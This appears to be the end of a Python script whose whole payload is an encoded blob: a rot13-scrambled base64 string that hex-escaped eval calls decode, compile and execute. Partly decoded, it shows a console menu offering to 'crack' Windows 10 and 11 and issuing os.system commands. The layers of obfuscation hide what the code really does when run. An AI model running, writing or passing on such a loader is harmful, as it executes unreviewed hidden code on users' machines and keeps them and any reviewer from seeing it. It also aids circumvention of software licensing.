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'; joy = '\x72\x6f\x74\x31\x33'; trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29'); eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
